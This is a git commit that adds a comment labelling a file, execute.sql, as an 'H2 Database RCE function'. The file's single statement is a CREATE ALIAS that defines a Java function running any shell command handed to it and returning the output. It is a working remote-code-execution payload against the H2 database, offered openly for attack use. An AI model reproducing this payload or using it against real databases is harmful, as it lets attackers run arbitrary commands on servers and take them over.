39fb4fb10f6d7ed1be077a895b8902d010b81487
Aravazhi Rajendran <20073239+aravazhimdr@users.noreply.github.com>
2024-04-03 19:08:06 +0530

    Update execute.sql

--- execute.sql
+++ execute.sql
@@ -1,1 +1,4 @@
+/*
+H2 Database RCE function 
+*/
 CREATE ALIAS OVOCMDEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
